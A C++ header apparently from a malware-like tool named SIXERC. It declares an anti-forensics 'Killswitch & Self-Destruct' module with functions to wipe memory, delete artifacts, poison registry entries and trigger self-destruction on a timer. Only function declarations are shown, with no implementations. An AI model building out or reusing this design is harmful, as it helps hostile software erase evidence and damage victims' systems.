// ============================================================================
// SIXERC — Module 6: Killswitch & Self-Destruct (KSD)
// Erases all traces from the system
// ============================================================================

#pragma once

#include <string>

namespace sixerc::ksd {

// Wipe all memory buffers
void wipe_memory();

// Delete all local artifacts
void delete_artifacts();

// Overwrite registry entries
void poison_registry();

// Full self-destruct sequence
void self_destruct();

// Set killswitch timer (hours)
void set_killswitch_timer(uint32_t hours);

// Check if killswitch should trigger
bool should_trigger();

} // namespace sixerc::ksd
